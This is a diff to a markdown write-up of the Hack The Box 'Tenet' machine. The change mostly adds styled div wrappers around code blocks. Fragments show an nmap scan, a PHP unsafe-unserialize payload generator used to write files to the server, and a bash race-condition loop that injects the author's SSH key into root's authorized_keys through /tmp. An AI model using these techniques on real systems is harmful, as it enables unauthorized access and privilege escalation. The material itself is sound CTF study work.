@@ -3,7 +3,8 @@
 </style>
 # Hackthebox - Tenet
 First I run Nmap to scan for open ports.
-```zsh
+<div style="background-color: rgb(50, 50, 50);">
+```bash
 # Nmap 7.91 scan initiated Sun Jun 27 14:19:15 2021 as: nmap -sC -sV -oA nmap/nmap 10.129.129.20
 Nmap scan report for 10.129.129.20
 Host is up (0.17s latency).
@@ -22,7 +23,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Jun 27 14:19:31 2021 -- 1 IP address (1 host up) scanned in 15.52 seconds
 ```
-
+</div>
+	
 Port 80 which is HTTP is open so I open the page and got only Apache ubuntu default page.
 ![](webpage.png)
 
@@ -45,6 +47,8 @@ Then there is the backup file. The usual syntax for a backfile is **filename.bak
 ![](backupfile.png)
 
 I download the file and the content of it.
+
+<div style="background-color: rgb(50, 50, 50);">
 ```php
 <?php
 
@@ -77,10 +81,12 @@ $app -> update_db();
 
 ?>
 ```
+</div>
 
 The file uses unserialize on a user's input which is unsafe, read more here(https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/). I can call the **__destruct()** function which calls **file_put_contents** which means I can put arbitrary file to the server.
 
 So I craft the payload.
+<div style="background-color: rgb(50, 50, 50);">
 ```php
 <?php
 class DatabaseExport{
@@ -90,7 +96,8 @@ class DatabaseExport{
 print urlencode(serialize(new DatabaseExport)); 
 ?>
 ```
-
+</div>
+	
 Ran the script.
 ![](phpexploit.png)
 
@@ -116,6 +123,7 @@ Now I run **sudo -l** as the user neil and he can run **enableSSH.sh** as sudo.
 ![](sudo-l.png)
 
 I outputed the content of the file and analyze what it does.
+<div style="background-color: rgb(50, 50, 50);">
 ```bash
 #!/bin/bash
 
@@ -153,13 +161,15 @@ key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6i
 addKey
 checkAdded
 ```
-
+</div>
+	
 It looks pretty straight forward. It is outputing the key variable to the root's SSH public key. But it is doing it through the **/tmp** directory. If I can overwrite the file in /tmp directory before it outputs the file to the root's SSH key, I can put any key I want.
 
 So I create a SSH key pair, leaving the passphrase empty.
 ![](keygen.png)
 
 Because this is a race condition, I need to do it really fast. So I created a bash script to check if a file exists in the **/tmp** directory which only contains directories and overwrite it with my public SSH key using an infinite while loop.
+<div style="background-color: rgb(50, 50, 50);">
 ```bash
 #!/bin/bash
 KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDagDI0wEezhuvADA1jAKQDPOA8Sl9SVNABZ71PTTb/FlDGoOOOhu3AruhhVsCZmsDrosy+nF7nBo5qn61e4prCAowLCjf6fzEomp7CRGQfOSSrEyDYsZjltEC+7q9Upl9wM/PrKom1CJQSaGccauL7oWYx19VKjMEbae+zPpMo6rFZK7b5+VyqVhYVF1yT+XN36lSNTDGcyZHisVJWj47eUqAtotUWDgt4+Eb4cKcx0ODfWLGkG/CrEU+7sSMCUnRJysnWRvdo+2FjMbwUdZEeGQvida8+/ir7x4BmAjKWzJ+XlTIidnAc2K/NuBe0ZzgY5RG5UbN9B7XcPjSdUQFtaBITRHMGddTzEVDcOAyVmbgAWdzgOCM0yuyoRPE3ROBkyTwpfq9jL4Wre0zmek7Trtimf/Hjcadn/ShFwDDXAYksOu0d1bsVI8wnC828utLgg9HErZ9t+FZi/AKg0o3hZyCGgi9ES59vQNhwRX6Webn4Y1HwRQyEh3r+AJIFx2k= htb-jixprotiger@htb-m9plirztss"
@@ -170,6 +180,7 @@ do
 	done
 done
 ```
+</div>
 
 I execute my script and run the enableSSH.sh as sudo a couple times to make sure my script overwrites it.
 ![](runenablessh.png)
